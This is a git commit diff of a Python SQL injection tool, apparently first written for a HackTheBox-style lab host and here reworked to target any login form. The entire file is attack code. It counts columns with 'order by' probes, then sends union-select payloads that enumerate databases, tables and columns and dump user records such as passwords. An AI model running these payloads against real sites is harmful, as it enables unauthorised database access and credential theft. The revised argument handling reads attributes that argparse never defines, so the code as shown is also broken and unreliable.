1c8693c217d7ceb835108e9a246e828a4ce83b6b
jorgearma <jorgesiemprearmando@gmail.com>
2024-06-19 18:34:24 +0200

    1.0.1

--- sqli_login_tool.py
+++ sqli_login_tool.py
@@ -2,74 +2,106 @@ import requests
 import sys
 import argparse
 
-def make_request(url: str) -> int:
+def make_request(url: str, content_length: int, email_field: str, password_field: str) -> int:
     for x in range(100, 0, -1):
-        ress = requests.post(url=url, data={"email": f"' order by {x}-- -", "password": "test"})
-        if len(ress.text) != 33490:
+        ress = requests.post(url=url, data={email_field: f"' order by {x}-- -", password_field: "test"})
+        if len(ress.text) != content_length:
             print("The number of columns inside the table:", x)
             return x
     return 0
 
-def make_sqli(num_columns: int):
-    url = "http://goodgames.htb/login"
+def make_sqli(url: str, num_columns: int, keyword: str, email_field: str, password_field: str):
     column_placeholders = ','.join(str(i) for i in range(1, num_columns))
     
     # Obtener la versión de la base de datos
-    (f"' union select {column_placeholders},@@version-- -")
-    data = {"email": f"' union select {column_placeholders},@@version-- -", "password": "test"}
+    data = {email_field: f"' union select {column_placeholders},@@version-- -", password_field: "test"}
     response = requests.post(url=url, data=data)
-    print(find_and_print(response.text.strip(), "Welcome"))
+    print(find_and_print(response.text.strip(), keyword))
     
     # Obtener los nombres de las bases de datos
-    (f"' union select {column_placeholders},schema_name from information_schema.schemata-- -")
-    data = {"email": f"' union select {column_placeholders},schema_name from information_schema.schemata-- -", "password": "test"}
+    data = {email_field: f"' union select {column_placeholders},schema_name from information_schema.schemata-- -", password_field: "test"}
     response = requests.post(url=url, data=data)
-    print(find_and_print(response.text.strip(), "Welcome"))
+    print(find_and_print(response.text.strip(), keyword))
     
     # Obtener los nombres de las tablas en una base de datos específica
     table_schema = input("Introduce el nombre del esquema de tabla ('main' por ejemplo): ")
-    (f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -")
-    data = {"email": f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -", "password": "test"}
+    data = {email_field: f"' union select {column_placeholders},table_name from information_schema.tables where table_schema='{table_schema}'-- -", password_field: "test"}
     response = requests.post(url=url, data=data)
-    print(find_and_print(response.text.strip(), "Welcome"))
+    print(find_and_print(response.text.strip(), keyword))
     
     # Obtener los nombres de las columnas de una tabla específica ('user' en este caso)
     table_name = input("Introduce el nombre de la tabla ('user' por ejemplo): ")
-    (f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -")
-    data = {"email": f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -", "password": "test"}
+    data = {email_field: f"' union select {column_placeholders},column_name from information_schema.columns where table_name='{table_name}'-- -", password_field: "test"}
     response = requests.post(url=url, data=data)
-    print(find_and_print(response.text.strip(), "Welcome"))
-
+    print(find_and_print(response.text.strip(), keyword))
 
     columns = input("Ingresa las columnas de 'user' separadas por comas (por ejemplo: id, name, password, email): ")
     columns_list = [col.strip() for col in columns.split(',')]
     
     sql_query = f"' union select {column_placeholders},group_concat({','.join(columns_list)}) from {table_name}-- -"
-    data = {"email": sql_query, "password": "test"}
+    data = {email_field: sql_query, password_field: "test"}
     response = requests.post(url=url, data=data)
-    print(find_and_print(response.text.strip(), "Welcome"))
-    
+    print(find_and_print(response.text.strip(), keyword))
 
 def find_and_print(text: str, marker: str) -> str:
-    start = text.find(marker)
-    if start != -1:
-        start += len(marker) + 1
-        end = text.find('<', start)
-        if end != -1:
-            return text[start:end]
-    return "No data found"
+    if marker:
+        start = text.find(marker)
+        if start != -1:
+            start += len(marker)
+            end = text.find('<', start)
+            if end == -1:
+                end = len(text)
+            return text[start:end].strip()
+        else:
+            print(f"Keyword '{marker}' not found in the response.")
+    else:
+        print("No keyword provided, printing the entire response.")
+    return text  # Return the entire text if the marker is not specified or not found
 
 def main():
-    parser = argparse.ArgumentParser(description="SQL Injection tool")
+    parser = argparse.ArgumentParser(
+        description="SQL Injection tool",
+        epilog="Example: python s9.py http://example.com/login --content 33490 --keyword Welcome --email email --pass password\n\n"
+               "To determine the content length, monitor the length of the response body when making a normal login request."
+    )
     parser.add_argument("url", help="URL of the login page")
+    parser.add_argument(
+        "--content",
+        type=int,
+        default=33490,
+        help="Expected content length for comparison. "
+             "You can find this by observing the length of the response body for a normal login attempt."
+    )
+    parser.add_argument(
+        "--keyword",
+        type=str,
+        default="",
+        help="Keyword to filter the response content. If not specified, the entire HTML will be printed."
+    )
+    parser.add_argument(
+        "--email",
+        type=str,
+        default="test@test.com",
+        help="Name of the email field in the form."
+    )
+    parser.add_argument(
+        "--pass",
+        type=str,
+        default="password",
+        help="Name of the password field in the form."
+    )
     args = parser.parse_args()
 
     try:
         url = args.url
-        num_columns = make_request(url)
+        content_length = args.content_length
+        keyword = args.keyword
+        email_field = args.email_field
+        password_field = args.password_field
+        num_columns = make_request(url, content_length, email_field, password_field)
         
         if num_columns:
-            make_sqli(num_columns)
+            make_sqli(url, num_columns, keyword, email_field, password_field)
         else:
             print("Failed to determine the number of columns.")
     except Exception as e:
@@ -78,3 +110,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
